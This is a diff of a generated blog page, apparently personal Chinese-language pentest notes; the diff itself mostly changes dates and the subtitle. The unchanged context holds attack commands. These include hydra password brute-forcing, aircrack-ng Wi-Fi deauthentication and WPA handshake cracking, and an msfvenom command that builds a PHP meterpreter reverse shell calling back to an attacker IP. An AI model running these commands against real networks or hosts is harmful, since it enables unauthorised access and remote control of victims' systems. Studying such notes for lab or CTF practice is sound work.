@@ -93,7 +93,7 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/59158832-170e2600-8af3-11e9-8238-9608a4f08714.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58418041-39e31800-80b9-11e9-8cd8-efc433d76bfd.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57535861-98985a00-7375-11e9-8485-9e86d74e2e0d.png">
-<meta property="og:updated_time" content="2019-11-29T02:24:11.737Z">
+<meta property="og:updated_time" content="2019-12-15T11:34:42.658Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="零碎知识[working]">
 <meta name="twitter:description" content="git123git log flag.php #查看文件的历史版本git diff &amp;#123;版本号&amp;#125; #查看历史版本号的内容和现在内容的不同git reset --hard &amp;#123;commit&amp;#125;  find1find / -user downfall 2&amp;gt;/dev/null  mariadb 踩坑运行 123mysql -urootuse mysql;selec">
@@ -168,7 +168,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">龙信仰总是能抓住战士们的心，或许是因为他们不求言语吧。</p>
+        <p class="site-subtitle">别浪费时间了,这里没什么值得你看的东西</p>
       
   </div>
 
@@ -337,8 +337,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-11-29T10:24:11+08:00">
-                2019-11-29
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-15T19:34:42+08:00">
+                2019-12-15
               </time>
             
           </span>
@@ -433,7 +433,7 @@
 
 <h3 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l downfall -P /usr/share/wordlists/rockyou.txt -t 4</span><br><span class="line">cewl -w dc2_passwords.txt http://dc-2</span><br></pre></td></tr></table></figure>
 
-<h3 id="aircrack"><a href="#aircrack" class="headerlink" title="aircrack"></a>aircrack</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlo1</span><br><span class="line">sudo airodump-ng wlo1mon</span><br><span class="line">sudo airodump-ng -w save_file -c 11 --bssid 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line">choose a active user</span><br><span class="line"></span><br><span class="line"> remain the terminal running above and start another.</span><br><span class="line"></span><br><span class="line">sudo aireplay-ng -0 100 -a 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; -c &#123;client_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line"> when there is WPA handshake show in the first terminal , continue.</span><br><span class="line">sudo aircrack-ng -w dict.txt -b &#123;wifi_mac&#125; save_file-01.cap</span><br></pre></td></tr></table></figure>
+<h3 id="aircrack"><a href="#aircrack" class="headerlink" title="aircrack"></a>aircrack</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlo1</span><br><span class="line">sudo airodump-ng wlo1mon</span><br><span class="line">sudo airodump-ng -w save_file -c 11 --bssid 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line">choose a active user</span><br><span class="line"></span><br><span class="line"> remain the terminal running above and start another.</span><br><span class="line"></span><br><span class="line">sudo aireplay-ng -0 100 -a 02:1A:11:F1:A2:AB&#123;wifi_mac&#125; -c &#123;client_mac&#125; wlo1mon</span><br><span class="line"></span><br><span class="line"> when there is WPA handshake show in the first terminal , continue.</span><br><span class="line">sudo aircrack-ng -w dict.txt -b &#123;wifi_mac&#125; save_file-01.cap</span><br><span class="line"></span><br><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>
 
 <h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>php 文件上传payload生成：</p>
 <p><code>sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=172.20.10.12 LPORT=9991 -f raw &gt; shell.php</code></p>
@@ -606,7 +606,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
